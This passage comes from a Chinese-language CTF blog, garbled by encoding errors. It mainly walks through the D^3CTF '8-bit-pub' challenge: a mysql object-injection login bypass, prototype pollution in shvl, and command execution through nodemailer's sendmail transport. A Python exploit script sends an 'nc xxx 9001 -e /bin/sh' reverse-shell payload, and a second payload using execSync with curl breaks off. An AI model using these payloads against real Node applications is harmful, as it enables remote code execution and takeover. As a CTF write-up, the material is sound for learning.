srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ® <a href="https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate" target="_blank" rel="noopener">https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate</a></p><p>æˆ‘ä»¬å¯ä»¥ç”¨Runtime.evaluate æ¥æ‰§è¡Œä»»æ„js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.ws = <span class="keyword">new</span> WebSocket(<span class="string">`ws://127.0.0.1:40027/devtools/page/98D1EC60387BE0038D514389E2887339 `</span>)</span><br><span class="line">ws.onmessage = (<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="built_in">document</span>.writeln(<span class="string">"&lt;h3&gt;"</span> + e.data + <span class="string">"&lt;/h3&gt;"</span>); &#125;)</span><br><span class="line">ws.onopen = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        id: <span class="number">1</span>,</span><br><span class="line">        method: <span class="string">'Runtime.evaluate'</span>,</span><br><span class="line">        params: &#123; <span class="attr">expression</span>: <span class="string">'document.body.innerHTML'</span> &#125;</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.summershrimp.com/uploads/upload_ef0259a59051d89cd59c3a272b05de51.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_ef0259a59051d89cd59c3a272b05de51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šçš„ã€‚é¢„æœŸå¥½åƒæ˜¯æ„é€ BSON æ•°æ®ã€‚æ„Ÿè§‰è·Ÿwebå…³ç³»ä¸å¤§ã€‚ã€‚ã€‚</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>  æ€»çš„æ¥è¯´é¢˜ç›®è´¨é‡éƒ½å¾ˆä¸é”™ã€‚å¾ˆéš¾æƒ³è±¡æ˜¯ç»™é«˜ä¸­ç”Ÿå‡†å¤‡çš„é¢˜ã€‚ã€‚ã€‚å…³äºå‰ç«¯çš„ä¸€äº›çŸ¥è¯†è‡ªå·±ä¹Ÿæœ‰äº†ä¸€äº›æ–°çš„è§è§£ã€‚å¸Œæœ›èƒ½æœ‰æœºä¼šæ€»ç»“ä¸‹ã€‚</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark" target="_blank" rel="noopener">https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark</a></p><p><a href="https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy" target="_blank" rel="noopener">https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D^3CTF 8-bit-pub</title>
      <link href="2021/03/06/D%5E3CTF-8-bit-pub/"/>
      <url>2021/03/06/D%5E3CTF-8-bit-pub/</url>
      
        <content type="html"><![CDATA[<p>å‘¨æœ«è¿›è¡Œçš„d^3CTFåŸæœ¬è‡ªå·±æ˜¯æ²¡å‚åŠ çš„ã€‚ä¸è¿‡å› ä¸ºè¢«é—®åˆ°äº†å…¶ä¸­ä¸€é“é¢˜ç›®æ‰€ä»¥å°±åšäº†ä¸‹, å¤§æ¦‚èŠ±äº†2ä¸ªå°æ—¶ã€‚é¢˜ç›®éš¾åº¦è™½ç„¶ä¸­ç­‰ï¼Œä¸è¿‡ä¸ªäººè®¤ä¸ºå…¶åˆ©ç”¨é“¾çš„ç»„æˆéƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„æ¼æ´ã€‚è¿™é‡Œåˆ†äº«ä¸‹è‡ªå·±çš„åšé¢˜æ€è·¯</p><a id="more"></a><h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>é¦–å…ˆæ‹¿åˆ°æºç åˆ†æä¸‹ã€‚å¹¶ä¸åƒç®€å•çš„nodejsé¢˜ç›®å­˜åœ¨æ˜¾çœ¼çš„æ¼æ´åˆ©ç”¨ç‚¹ã€‚ä½†æ˜¯æœ‰ä¸€äº›åœ°æ–¹æ˜¯æ‹¥æœ‰express å¼€å‘ç»éªŒçš„å°ä¼™ä¼´ç»ä¸èƒ½ç–å¿½æ‰çš„</p><p><img src="https://hackmd.summershrimp.com/uploads/upload_511d891830c1af317f68cad89595d906.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_511d891830c1af317f68cad89595d906.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œç”¨çš„æ˜¯æ²¡æœ‰<code>å±•å¼€</code>çš„postæ•°æ®ä¸­é—´ä»¶ä¸jsonä¸­é—´ä»¶ã€‚è¿™æ„å‘³ç€å½“æˆ‘ä»¬å‘é€jsonæ•°æ®æ—¶,å¯ä»¥ä¼ å…¥æ•°ç»„/å¯¹è±¡ã€‚</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥ç»§ç»­çœ‹é¢˜ç›®æ€è·¯ã€‚</p><p>è®¿é—®adminè·¯ç”±éœ€è¦<code>req.session.username</code> ä¸º admin. ä¹‹ååœ¨adminè·¯ç”±å¤„è°ƒç”¨äº†ä¸€ä¸ªéå¸¸æ˜¾çœ¼çš„èµ‹å€¼æ“ä½œã€‚æœ€åå°†æˆ‘ä»¬çš„æ•°æ®é€šè¿‡<code>nodemailer</code>ä¸­çš„<code>sendMail</code>å‘é€é‚®ä»¶ã€‚</p><p>æ—¢ç„¶éœ€è¦session ä¸ºadmin , æˆ‘ä»¬å°±è¦ä½œä¸ºadmin ç™»å½•ã€‚æˆ‘ä»¬æ¥çœ‹ç™»å½•sqlè¯­å¥çš„æ“ä½œã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql.query(<span class="string">"SELECT * FROM users WHERE username = ? AND password = ?"</span>,[username, password],<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå¥‡æ€ªã€‚è™½ç„¶æ²¡æœ‰å­—ç¬¦æ‹¼æ¥,ä½†ä¹Ÿæ²¡æœ‰ç”¨å¸¸è§„çš„å ä½ç¬¦å¤„ç†ã€‚ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚æˆ‘ä»¬æ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯¹è¿™ç§æƒ…å†µçš„å¤„ç†ã€‚<br><img src="https://hackmd.summershrimp.com/uploads/upload_f8b8316687168c885a30ded874c17969.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f8b8316687168c885a30ded874c17969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ç§è½¬ä¹‰å­—ç¬¦çš„ç”¨æ³•ã€‚ä½†æ˜¯æ³¨æ„æ­¤å¤„å¹¶æ²¡æœ‰é™åˆ¶ä¼ å…¥å‚æ•°åªèƒ½ä¸ºå­—ç¬¦ã€‚è¿˜è®°å¾—ä¸Šé¢jsonä¸­é—´ä»¶çš„å­˜åœ¨å—ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥ç›´æ¥ä¼ å…¥å¯¹è±¡/æ•°ç»„,è€Œmysqlä¾èµ–å¯¹äºè¿™ç§æƒ…å†µçš„å¤„ç†æ˜¯å–œé—»ä¹è§çš„ï¼š<br><img src="https://hackmd.summershrimp.com/uploads/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ­¤å¤„çš„é”®å€¼ä¼šè¢«å±•å¼€ï¼Œé‚£æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªçœŸå€¼çš„ç™»å½•è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">`password`</span> =<span class="number">1</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ç™»å½•è·¯ç”±å¹¶æ²¡æœ‰è¯­å¥åˆ¤æ–­ä¼ å…¥å‚æ•°æ˜¯å¦åªä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨<code>{&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;: {&quot;password&quot;: &quot;1&quot;}}</code> æˆåŠŸç™»å½•,æ¥åˆ°adminè·¯ç”±ã€‚</p><p>ps: ä¹‹å‰å‡ºNCTF çš„nosqlæ³¨å…¥æ—¶å°±æ›¾å¼ºè°ƒè¿‡,ä¼ å‚ä¸€å®šè¦æ£€æŸ¥ç±»å‹ã€‚è¿™ä¸¤å¤„éƒ½æ˜¯å› ä¸ºå…è®¸jsonæ•°æ®ä¼ å…¥å¯¹è±¡å¯¼è‡´æ³¨å…¥çš„å…¸å‹ã€‚ä¹Ÿæ˜¯è€åˆ°æ‰ç‰™çš„é—®é¢˜äº†ã€‚</p><h2 id="prototype-pollution-to-RCE"><a href="#prototype-pollution-to-RCE" class="headerlink" title="prototype pollution to RCE"></a>prototype pollution to RCE</h2><p>  æ¥ä¸‹æ¥æˆ‘æŠŠé‡å¿ƒæ”¾åœ¨adminæ§åˆ¶å™¨é‚£éå¸¸æ˜¾çœ¼çš„ä»£ç é‚£ï¼Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">  shvl.set(contents, key, req.body[key]);</span><br><span class="line">&#125;);</span><br><span class="line">contents.from = <span class="string">'"admin" &lt;admin@8-bit.pub&gt;'</span>;</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰node æ¼æ´çš„åº”è¯¥ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥è¿™é‡Œå¯èƒ½å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚<br>ï¼ˆä¸ç›´æ¥ä¼ å€¼éè¦éå†å¯æ§jsonæ•°æ®çš„keys,å¤ªæ˜æ˜¾äº†ã€‚ã€‚ã€‚ï¼‰</p><p>ä¸Šgithubæœç´¢ä¸‹shvlä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªstar è¿100éƒ½ä¸åˆ°çš„ä¾èµ–ã€‚å¦‚æœå…³æ³¨è¿‡hackeroneä¸Šnode ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´çš„è¯ï¼Œå°±ä¼šç•™æ„åˆ°ä¸Šé¢æœ‰å¾ˆå¤šéå¸¸å†·é—¨çš„ä¾èµ–çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¿™äº›ä¾èµ–å¤§å¤šä½¿ç”¨é‡å°‘ï¼Œä»¥è‡³äºå¼€å‘è€…æœ‰æ—¶ä¹Ÿæ‡’å¾—ä¿®ã€‚å®˜æ–¹ä¹Ÿä¸ä¼šæ³¨é‡å…¶å®‰å…¨æ€§(æ‰€ä»¥å¼€å‘ä¸­è¿˜æ˜¯ç”¨ä½¿ç”¨é‡å¤šçš„ä¾èµ–2333)</p><p>æŒ‰ç…§è¿™ä¸ªæ€è·¯æœç´¢<code>shvl prototype pollution</code>ä¸éš¾å‘ç°</p><p><a href="https://snyk.io/vuln/SNYK-JS-SHVL-1054936" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SHVL-1054936</a> </p><p>çš„ç¡®å­˜åœ¨æ±¡æŸ“æ¼æ´ã€‚ä¸è¿‡è²Œä¼¼ç°åœ¨ç‰ˆæœ¬å·²ç»ä¿®å¤äº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>  (<span class="params">object, path, val, obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/__proto__/</span>.test(path) &amp;&amp; ((path = path.split ? path.split(<span class="string">'.'</span>) : path.slice(<span class="number">0</span>)).slice(<span class="number">0</span>, <span class="number">-1</span>).reduce(<span class="function"><span class="keyword">function</span> (<span class="params">obj, p</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.pop()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ¯”è¾ƒå°´å°¬çš„æ˜¯ï¼Œä½œè€…ä¿®å¤çš„æ–¹å¼åªæ˜¯å•çº¯çš„æ£€æŸ¥ <code>path</code> æ˜¯å¦å«<code>__proto__</code>. ç„¶è€Œå®ƒèµ‹å€¼çš„æ–¹æ³•æ˜¯é€šè¿‡å¾ªç¯å¯¹è±¡èµ‹å€¼çš„ã€‚ç»•è¿‡æ–¹æ³•å¤ªå¸¸è§äº†ã€‚<code>constructor.prototype</code>å³å¯</p><p>poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shvl = <span class="built_in">require</span>(<span class="string">'shvl'</span>); </span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125; </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Before : "</span> + obj.isAdmin); </span><br><span class="line">shvl.set(obj, <span class="string">'constructor.prototype.isAdmin'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"After : "</span> + obj.isAdmin);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Before : undefined</span></span><br><span class="line"><span class="comment">After : true</span></span><br><span class="line"><span class="comment">[Object: null prototype] &#123; isAdmin: true &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ±¡æŸ“åˆ°åŸºç±»åŸå‹çš„ä»»æ„å±æ€§ä¸Šäº†,è¿™å¯ä»¥ç®—æ˜¯éå¸¸å¼ºå¤§çš„ã€‚å‡å¦‚é¢˜ç›®ç”¨äº†æ¨¡æ¿å¼•æ“åŸºæœ¬ä¸Šå°±ç»“æŸç›´æ¥RCEäº†ã€‚ä¸è¿‡æ˜¾ç„¶ï¼Œé¢˜ç›®çš„nodemailerè¿˜æ²¡æœ‰ç”¨åˆ°ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹nodemailerçš„å†å²æ¼æ´</p><p>å¾ˆå¿«æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°<br><a href="https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834</a><br>è¿™é‡Œçš„å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚æ¥çœ‹ä¸‹å…³é”®ä»£ç </p><p>nodemailer\lib\sendmail-transport\index.js<br>ä¸­ , SendmailTransport ç±»çš„send æ–¹æ³•<br><img src="https://hackmd.summershrimp.com/uploads/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå‘½ä»¤æ³¨å…¥çš„åŸç†æ˜¯ï¼Œargså‚æ•°<code>-i</code>ä¸é»˜è®¤ä¸ºç©ºçš„<code>this.args</code>ä¸å¯æ§çš„<code>envelope.to</code>æ‹¼æ¥äº†ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥é¢å¤–å¡å…¥å…¶ä»–å‚æ•°ã€‚åšåˆ°å‚æ•°æ³¨å…¥,åƒ<code>-Dfilename@example.com (Debug output ffile)</code></p><p>ç„¶å,ä¸‹é¢è°ƒç”¨äº†ä¸€ä¸ª_spawn,å…¶å®å°±æ˜¯<code>spawn(sendmail,args)</code>ã€‚å¦‚æœè¯´phpé‡Œå¤§å®¶æœ€å…ˆä¼šå»æ‰¾çš„æ¶æ„å‡½æ•°æ˜¯<code>system,exec</code>ç­‰oså‡½æ•°ï¼Œnodejsä¸­ç›¸å¯¹åº”çš„è‚¯å®šå°±æ˜¯<code>spawn,execSync</code>è¿™æ ·çš„äº†(å…¶å®éƒ½æ˜¯è°ƒç”¨çš„spawn),æ›´ä¸ç”¨è¯´,åŸºç±»æ±¡æŸ“ + child_process = RCE.</p><p>æ—¢ç„¶è¿™é‡Œæœ‰å­è¿›ç¨‹å‡½æ•°ã€‚æˆ‘ä»¬åˆæœ‰ä»»æ„é“¾ä¸Šçš„æ±¡æŸ“,è¿™æ ·å°±æœ‰ä¸¤ç§æ–¹å¼RCEäº†ã€‚ä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•å°±æ˜¯ç®€å•æ£€æŸ¥ä¸‹çœ‹çœ‹å…¶å­è¿›ç¨‹å‡½æ•°å‚æ•°æ˜¯å¦å¯æ§ã€‚</p><p>åˆ†äº«ä¸€ä¸ªéå¸¸å¸¸è§çš„å°æŠ€å·§ï¼Œè¦çŸ¥é“è¿™ä¸ªå±æ€§æ˜¯ä¸æ˜¯ä¼šå—åˆ°é“¾ä¸Šæ±¡æŸ“çš„å½±å“ï¼Œç›´æ¥çœ‹ä»£ç ç»“æ„å°±å¥½äº†<br><img src="https://hackmd.summershrimp.com/uploads/upload_25ae990dedc37a7e21849968339fcad6.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_25ae990dedc37a7e21849968339fcad6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åŸºæœ¬ä¸Šå‡ºç°<code>if(xxx.xxx)</code>è¿™æ ·è¯­å¥çš„,å®ƒç”¨æ¥åˆ¤æ–­çš„å±æ€§å¤šåŠæ˜¯æ²¡æœ‰é¢„å…ˆèµ‹å€¼çš„ã€‚æ‰€ä»¥æ‰ä¼šé€šè¿‡ifæ¥åˆ¤æ–­æ˜¯å¦æœ‰å€¼,æ¥å†™æ¡ä»¶è¯­å¥ã€‚è€Œè¿™äº›å±æ€§åŸºæœ¬éƒ½æ˜¯å¯æ±¡æŸ“çš„ã€‚æ­£å› å¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åšåˆ°æ±¡æŸ“<code>options.args</code> ä¸<code>options.path</code>.ç­‰äºæ˜¯å®Œå…¨æ§åˆ¶äº†spawnçš„å‚æ•°ã€‚</p><p>spawnçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯command,ç¬¬äºŒä¸ªæ˜¯æ•°ç»„æ¥æ”¶ command-line argumentsã€‚æˆ‘ä»¬å¯ä»¥ç”¨<code>/bin/sh -c &quot;xxx&quot;</code>æ‰§è¡Œä»»æ„å‘½ä»¤</p><p>é‚£ä¹ˆé¢˜ç›®ä¸­çš„sendmailä¼šä¸ä¼šé»˜è®¤èµ°åˆ°è¿™é‡Œå‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹mail.jsä¸­<code>nodemailer.createTransport</code>çš„ä»£ç </p><p><img src="https://hackmd.summershrimp.com/uploads/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶éœ€è¦optionsä¸­è®¾ç½® sendmail ä¸ºtrue,æˆ‘ä»¬çš„<code>transporter</code>æ‰ä¼šæ˜¯<code>SendmailTransport</code>. è¿™é‡Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„é“ç†ï¼Œæˆ‘ä»¬ç›´æ¥æ±¡æŸ“ sendmail å±æ€§å³å¯</p><p>æ¥ä¸‹æ¥å°±å¾ˆè½»æ¾äº†</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  æ–¹ä¾¿è°ƒè¯•èµ·è§ï¼Œæˆ‘ä»¬å…ˆæœ¬åœ°èµ·ä¸€ä¸‹ä»£ç ã€‚è¿™é‡Œéƒ½å¾ˆå¥½é…ç½®ï¼Œç¨å¾®éœ€è¦æ³¨æ„çš„æ˜¯smtpæœåŠ¡å™¨çš„è®¾ç½®ã€‚æˆ‘ä»¬ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ <a href="https://nodemailer.com/about/" target="_blank" rel="noopener">https://nodemailer.com/about/</a> æŒ‰ç…§å®˜æ–¹çš„é…ç½®ç›´æ¥<a href="https://ethereal.email/create" target="_blank" rel="noopener">https://nodemailer.com/about/</a> åˆ›ç«‹ä¸€ä¸ªè´¦æˆ·ã€‚å°±å¯ä»¥è·‘èµ·æ¥äº†</p><p>ç„¶åæŒ‰ç…§ä¸Šé¢çš„åˆ©ç”¨é“¾,å†™expæ‰“ä¸€ä¸‹ï¼Œæœ¬åœ°å¾ˆå¿«é€šäº†ï¼Œè¿œç¨‹çš„è¯æ‰¾äº†ä¸‹åªèƒ½ncå¼¹shellæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">'http://ce775e2992.8bit-pub.d3ctf.io/user/signin'</span>, json=&#123;</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: &#123;</span><br><span class="line">        <span class="string">'password'</span>: <span class="number">1</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">    cookies=&#123;</span><br><span class="line">    <span class="string">'session'</span>: <span class="string">'s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8'</span></span><br><span class="line">&#125;)</span><br><span class="line">print(r.json())</span><br><span class="line">r = s.post(<span class="string">'http://ce775e2992.8bit-pub.d3ctf.io/admin/email'</span>, json=&#123;</span><br><span class="line">    <span class="string">'from'</span>: <span class="string">"admin@123.com"</span>,</span><br><span class="line">    <span class="string">'to'</span>: <span class="string">'j3c9g.tls@inbox.testmail.app'</span>,</span><br><span class="line">    <span class="string">'contents'</span>: <span class="string">"bycbycbyc"</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.sendmail"</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.path"</span>: <span class="string">"/bin/sh"</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.args"</span>: [<span class="string">"-c"</span>, <span class="string">"nc xxx 9001 -e /bin/sh"</span>],</span><br><span class="line">&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">'session'</span>: <span class="string">"s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8"</span></span><br><span class="line">&#125;)</span><br><span class="line">print(r.json())</span><br></pre></td></tr></table></figure><p>å½“ç„¶ã€‚å¦‚æœä¸æƒ³æ‰¾æ±¡æŸ“åˆ°rceçš„å±æ€§æ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ªé€šæ³•ã€‚å°±æ˜¯æˆ‘åœ¨NCTF2020 ä¸­å‡ºçš„<a href="https://github.com/baiyecha404/My-NCTF2020-Challs/tree/master/PackageManager_v2.0" target="_blank" rel="noopener">packagemanager_v2.0 </a> é‡Œçš„åˆ©ç”¨</p><p>å½“æ—¶æåˆ°è¿‡äº†ã€‚åˆ°åŸºç±»çš„æ±¡æŸ“+ ä»»æ„å­è¿›ç¨‹ = RCEã€‚è¿™é‡Œæ— è„‘ç›´æ¥æ±¡æŸ“ç¯å¢ƒå˜é‡å½“ç„¶æ˜¯å¯ä»¥çš„</p><p>æ”¹ä¸‹å°±è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"constructor.prototype.sendmail"</span>: True,</span><br><span class="line"><span class="string">"constructor.prototype.shell"</span>:<span class="string">"node"</span>,</span><br><span class="line"><span class="string">"constructor.prototype.env.NODE_DEBUG"</span>: <span class="string">"require('child_process').execSync('curl 